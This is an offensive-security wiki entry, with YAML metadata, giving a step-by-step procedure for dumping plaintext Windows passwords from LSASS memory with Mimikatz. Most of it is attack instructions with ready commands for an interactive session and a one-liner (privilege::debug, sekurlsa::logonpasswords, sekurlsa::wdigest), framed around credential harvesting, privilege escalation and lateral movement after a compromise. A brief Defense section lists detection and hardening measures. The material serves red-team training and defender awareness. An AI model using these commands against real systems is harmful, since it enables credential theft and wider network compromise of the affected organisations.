---
id: 1adbc996-425b-4da4-ad87-6dd4a011328e
name: Windows-Mimikatz-Password-Extraction
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:27.087804+00:00'
updated_at: '2023-04-10T20:37:17.332944+00:00'
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[Credential Dumping]]'
sub_techniques: []
tags:
  - credential-access
  - mimikatz
  - windows
commands:
  - '[[commands/mimikatz-interactive-password-extraction]]'
  - '[[commands/mimikatz-one-liner-password-extraction]]'
platforms:
  - Windows
tools:
  - '[[tools/Mimikatz]]'
validated: true
---

# Windows-Mimikatz-Password-Extraction

## Summary

This procedure uses Mimikatz to extract plaintext passwords from Windows memory, targeting logon credentials and WDigest-stored passwords. It enables attackers to obtain credentials for privilege escalation or lateral movement in a Windows environment, assuming administrator access on the target system.

## Description

Mimikatz exploits vulnerabilities in Windows authentication mechanisms, such as LSASS (Local Security Authority Subsystem Service), to dump plaintext passwords directly from memory. This is particularly effective against systems where users, including domain admins, have logged in, as their credentials remain in memory. The procedure covers both an interactive Mimikatz session for comprehensive extraction (including WDigest) and a one-liner for quick logon password dumps. It requires debug privileges and is typically used post-compromise for credential harvesting. Success provides usable passwords for further network compromise, but detection risks are high due to process injection and privilege elevation.

## Requirements

1. Administrator-level privileges on the target Windows system (local or remote).
2. Mimikatz binary downloaded and placed in an accessible directory (e.g., C:\temp\mimikatz).
3. PowerShell execution policy allowing script execution (bypass if needed).
4. Target system running Windows (Vista or later, with LSASS in memory).

## Defense

- Enable Credential Guard on Windows 10/11 to protect LSASS from extraction.
- Monitor for debug privilege escalations via Event ID 4672/4673 in Windows Security logs.
- Use antivirus/EDR tools to detect Mimikatz signatures or unusual LSASS access (e.g., via Sysmon Event ID 10).
- Implement LSA protection to prevent memory dumps and enforce multi-factor authentication to limit credential value.

## Objectives

1. Obtain plaintext logon passwords from active user sessions in memory.
2. Extract WDigest credentials for additional password recovery.
3. Enable lateral movement or privilege escalation using harvested credentials.

## Instructions

### Step 1: Launch Mimikatz Interactively

**Context**: Start an interactive Mimikatz session to enable debug privileges and perform a full credential dump. This method allows for logging and extraction of both logon passwords and WDigest entries, providing comprehensive results.

**Command** ([[commands/mimikatz-interactive-password-extraction]]):

```powershell
PS C:\temp\mimikatz> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # log
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
mimikatz # exit
```

> This launches Mimikatz, elevates to debug privileges (required for LSASS access), enables logging for output persistence, dumps logon passwords from LSASS, and then extracts WDigest passwords (plaintext if enabled). Expected output includes user details, NTLM hashes, and plaintext passwords if available. Verify success by checking for 'Privilege '20' OK' and populated credential lists.

### Step 2: Alternative One-Liner Extraction

**Context**: For a quicker dump without interactive session, use a one-liner to extract logon passwords directly. This is less comprehensive (no WDigest or logging) but faster for targeted extractions.

**Command** ([[commands/mimikatz-one-liner-password-extraction]]):

```powershell
PS C:\temp\mimikatz> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

> This combines privilege elevation and logon password dump in a single invocation, exiting immediately after. Use when interactive access is risky or time-constrained. Expected output mirrors the interactive logonpasswords command, listing credentials. If debug fails, check for UAC elevation or run as admin.
